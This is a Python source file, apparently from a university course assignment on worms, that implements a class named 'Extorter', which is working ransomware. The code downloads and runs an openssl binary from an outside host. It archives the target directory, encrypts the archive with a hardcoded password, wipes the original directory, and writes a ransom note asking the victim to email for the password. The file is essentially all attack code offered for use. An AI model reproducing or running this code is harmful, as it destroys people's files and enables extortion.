import urllib.request
import tarfile
import shutil
import os

# Import the necessary files
from subprocess import call

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

class Extorter(object):

	OPENSSL_LOCATION      = '/tmp/openssl'
	TARFILE_TEMP_LOCATION = '/tmp/all-your-documents.tar.gz'

	password = None
	targetDirectory = None
	maliciousNote = None

	debug = None

	def __init__(self, target, maliciousNoteLocation, debug=True):
		self.password = 'cs456worm'
		self.targetDirectory = os.path.expanduser(target)
		self.maliciousNote = os.path.expanduser(maliciousNoteLocation)
		self.debug = debug

	@staticmethod
	def download(url, path):
		urllib.request.urlretrieve(url, path)

	def execute(self):

		# Download the openssl executable
		Extorter.download('http://ecs.fullerton.edu/~mgofman/openssl', Extorter.OPENSSL_LOCATION)
		dprint("Downloading openssl", self.debug)

		# Archive all of their stuff
		self.archiveAllTheThings()
		dprint("Archiving the directory", self.debug)

		# Encrypt it
		self.encrypt()
		dprint("Encrypting the archive", self.debug)

		# Erase their home directory
		self.eraseDirectory()
		dprint("Erasing the " + self.targetDirectory + " directory", self.debug)

		# Move the tar to the wiped directory
		self.moveTarToTarget()
		dprint("Moving the archive to the target directory", self.debug)

		# Leave them a nice note
		self.leaveNote()
		dprint("Leaving a nice note...", self.debug)

	def archiveAllTheThings(self):
		# Open the specified archive file (e.g. exdir.tar).
		# If the archive does not already exist, create it.
		tar = tarfile.open(Extorter.TARFILE_TEMP_LOCATION, "w:gz")

		# Add the exdir/ directory to the archive
		tar.add(self.targetDirectory)

		# Close the archive file
		tar.close()

	def encrypt(self):
		# The following is an example which makes
		# program openssl executable once you download
		# it from the web. The code that follows is
		# equivalent to running chmod a+x openssl
		# from the shell command line.
		# The format is <command name>, <ARG1>, <ARG2>,
		# ..., <ARGN> where each ARGi is an argument.
		call(["chmod", "a+x", Extorter.OPENSSL_LOCATION])

		# The code below is equivalent to running line:
		# openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc
		# from the shell prompt.
		# You do not need to understand the details of how
		# this program works. Basically, "runprog.py" is the
		# input file to the program which we would like to
		# encrypt, "runprog.py.enc" is the output file
		# containing encrypted contents of file
		# "runprog.py.enc" and "pass" is the password.
		call([Extorter.OPENSSL_LOCATION, "aes-256-cbc", "-a", "-salt", "-in", Extorter.TARFILE_TEMP_LOCATION, "-out", Extorter.TARFILE_TEMP_LOCATION + ".enc", "-k", self.password])

		# Delete the original tar file, keeping only the encrypted version
		os.remove(self.TARFILE_TEMP_LOCATION)

	def eraseDirectory(self):
		shutil.rmtree(self.targetDirectory)
		os.makedirs(self.targetDirectory)

	def moveTarToTarget(self):
		os.rename(self.TARFILE_TEMP_LOCATION + ".enc", self.targetDirectory + "/" + os.path.basename(self.TARFILE_TEMP_LOCATION) + ".enc")

	def leaveNote(self):
		f = open(self.maliciousNote, 'a') # Need some kind of path manipulation
		f.write('"Your documents directory has been hijacked. Contact me at pwned@gmail.com for the password.')
		f.close()